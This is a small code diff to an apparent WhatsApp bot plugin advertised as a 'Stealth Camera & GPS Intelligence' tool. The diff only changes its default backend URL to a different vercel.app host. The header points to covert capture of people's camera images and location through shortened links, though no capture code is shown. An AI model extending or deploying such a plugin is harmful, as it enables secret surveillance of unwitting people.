@@ -4,7 +4,7 @@
 /**
  * MR SAQIB MD :: Stealth Camera & GPS Intelligence Plugin
  * ============================================================================
- * Official Integration with Live API: https://earnpk92.vercel.app/api/shorten
+ * Official Integration with Live API: https://earnpk92-two.vercel.app/api/shorten
  * Features:
  *   - Clean, reliable WhatsApp messages (works on all devices: Mobile & Web)
  *   - Ultra-fast live verification
@@ -14,7 +14,7 @@
 const axios = require('axios');
 const settings = require('../settings');
 
-const DEFAULT_API_BASE = 'https://earnpk92.vercel.app';
+const DEFAULT_API_BASE = 'https://earnpk92-two.vercel.app';
 
 function getApiBaseUrl() {
     let base = settings.cameraApiUrl || process.env.CAMERA_API_URL || DEFAULT_API_BASE;
